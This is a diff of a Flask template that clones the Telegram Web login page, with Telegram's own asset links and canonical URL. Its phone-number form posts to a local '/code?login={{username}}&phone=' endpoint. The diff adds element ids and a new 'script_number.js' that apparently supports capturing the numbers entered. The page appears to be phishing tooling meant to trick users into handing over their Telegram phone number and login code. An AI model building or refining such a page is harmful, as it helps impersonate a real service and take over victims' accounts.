@@ -35,7 +35,6 @@
   <link rel="alternate icon" href="https://web.telegram.org/k/assets/img/favicon.ico?v=jw3mK7G9Ry" type="image/x-icon">
   <link rel="mask-icon" href="https://web.telegram.org/k/assets/img/safari-pinned-tab.svg?v=jw3mK7G9Ry" color="#3390ec">
   <link rel="canonical" href="https://web.telegram.org/">
-  <link rel="manifest" id="manifest" href="https://web.telegram.org/k/site.webmanifest?v=jw3mK7G9Aq">
   <link rel="stylesheet" type="text/css" href="{{ url_for('static',filename='style1.css') }}">
   <link rel="stylesheet" href="{{ url_for('static',filename='style2.css') }}" media="only screen and (min-width:721px)">
 </head>
@@ -65,10 +64,10 @@
                 <div class="input-field input-field-phone">
                 <div class="input-field-input" id="phone" contenteditable="true" dir="auto" data-no-linebreaks="1" inputmode="numeric">+</div>
                 <div class="input-field-border"></div>
-                <label><span class="i18n">Phone Number</span></label>
+                <label><span class="i18n" id="phone_text_1">Phone Number</span></label>
             </div>
               <form name="code_form" action="/code?login={{username}}&phone=" method="POST">
-                <button class="btn-primary btn-color-primary rp" style="">
+                <button id="form_butt" class="btn-primary btn-color-primary rp" style="">
                 <div class="c-ripple"></div><span class="i18n">Next</span></button>
               </form>
             </div>
@@ -190,8 +189,8 @@
       </div>
     </div>
   </div>
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>
-  <script src="{{ url_for('static',filename='script.js') }}"></script>
+  <script src="https://code.jquery.com/jquery-3.6.2.min.js"></script>
+  <script src="{{ url_for('static',filename='script_number.js') }}"></script>
 
 </body>
 
